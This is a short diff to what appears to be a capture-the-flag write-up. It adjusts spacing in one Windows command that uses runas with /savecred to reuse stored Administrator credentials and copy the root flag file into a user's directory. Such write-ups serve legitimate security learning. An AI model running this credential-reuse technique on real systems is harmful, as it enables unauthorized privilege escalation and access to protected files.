@@ -20,5 +20,6 @@ Currently stored credentials:
 ```
 
 ```
-C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt >C:\Users\secuirty\root.txt"
+C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\secuirty\root.txt"
 ```
+
